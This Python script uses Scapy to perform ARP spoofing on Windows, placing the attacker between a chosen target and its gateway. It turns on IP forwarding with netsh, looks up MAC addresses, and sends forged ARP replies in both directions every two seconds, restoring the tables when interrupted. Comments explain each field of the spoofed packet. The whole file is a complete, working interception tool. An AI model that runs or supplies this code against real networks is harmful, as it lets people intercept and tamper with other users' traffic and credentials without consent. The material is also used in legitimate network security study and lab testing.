'''
srp return a tuple of two list. The first element is a list of tuples (packet sent, answer),
and the second element is the list of unanswered packets. These two elements are lists, 
but they are wrapped by an object to present them better, and to provide them with some methods
that do most frequently needed actions.

for e.g
answered, unanswered = srp()

1. answered is a list of two tuples (sent packets and received packets)
2. Unanswered is a list of unanswered packets

so ,
answered = [{sent1, received1}, {sent2, received2}, {sent3, received3}]
unanswered = [unanswered, unanswered, unanswered, ...]

output of srp() == ([answered], [unanswered])
'''
import os
import time
import subprocess
from scapy.all import *
from scapy.layers.l2 import ARP, Ether

# Enables IP forwarding in Windows using netsh command. Requires admin priviliges
def enable_ip_route():
    try:
        subprocess.run(
            ["netsh", "interface", "ipv4", "set", "global", "ipforwarding=enabled"],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print("[+] IP forwarding enabled on Windows")
    except subprocess.CalledProcessError:
        print("[!] Failed to enable IP forwarding. Run as administrator.")

def get_mac(ip):
    answered, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), verbose=0)
    if answered:
        return answered[0][1].src
    else:
        print(f"[!] Failed to get MAC for {ip}")
        return None
        
def spoof(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    #Below line creates a spoofed ARP reply packet claiming that host_ip (e.g., the router) is at the attacker's MAC address.
    #It tells the target (target_ip) to update its ARP table with this fake mapping.
                      #ReplyPacket  victimIP      victimMAC      Pretend to be host(router)   AttackerMAC
    arp_response = ARP(op='is-at', pdst=target_ip, hwdst=target_mac, psrc=host_ip,    hwsrc=get_if_hwaddr(conf.iface))
    send(arp_response, verbose=0)
    print(f"[+] Spoofed ARP to {target_ip}: claiming to be {host_ip}")

 
# Restores correct MAC address by sending real ARP response.
def restore(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    if not target_mac or not host_mac:
        return
    arp_restore = ARP(
        pdst=target_ip,
        hwdst=target_mac,
        psrc=host_ip,
        hwsrc=host_mac
    )
    send(arp_restore, count=5, verbose=0)
    print(f"[+] Restored ARP for {target_ip} — says {host_ip} is {host_mac}")

if __name__ == '__main__':
    print(f"Running on OS: {os.name}")
    print("[*] Make sure you're running this as Administrator and have Npcap installed.")

    target_ip = input("Enter the target IP address: ").strip()
    host_ip = input("Enter the host IP address (e.g., router/gateway): ").strip()

    enable_ip_route()

    try:
        while True:
            spoof(target_ip, host_ip)
            spoof(host_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] CTRL+C detected. Restoring network...")
        restore(target_ip, host_ip)
        restore(host_ip, target_ip)
        print("[+] Network restored. Exiting.")
